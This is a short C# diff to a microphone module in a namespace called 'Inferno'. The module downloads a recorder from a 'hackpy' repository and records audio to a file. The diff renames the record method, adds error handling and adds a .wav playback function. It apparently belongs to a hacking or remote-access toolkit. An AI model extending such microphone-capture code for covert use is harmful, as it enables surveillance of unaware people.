@@ -16,7 +16,7 @@ namespace Inferno
         public static string fmediaLINK = "https://raw.githubusercontent.com/LimerBoy/hackpy/master/modules/audio.zip";
 
         // Record audio from microphone
-        public static void record(int time, string filename = "recording.wav")
+        public static void Record(int time, string filename = "recording.wav")
         {
             // Check if fmedia.exe file exists
             if (!File.Exists(fmediaPATH + fmediaFILE))
@@ -48,7 +48,30 @@ namespace Inferno
                 output.filename = filename;
                 output.seconds = time;
                 core.Exit("Microphone recording saved", output);
+            } else
+            {
+                output.error = true;
+                core.Exit("Microphone not recording saved", output, 3);
             }
+        }
+
+        // Play audio (.wav)
+        public static void Play(string filename)
+        {
+            // Check file
+            if (!File.Exists(filename))
+            {
+                output.error = true;
+                core.Exit("Failed to play wav file " + filename + " not found!", output, 1);
+            } 
+            else
+            {
+                System.Media.SoundPlayer player = new System.Media.SoundPlayer(filename);
+                player.Play();
+                output.filename = filename;
+                core.Exit("Audio played!", output);
+            }
+            
         }
     }
 }
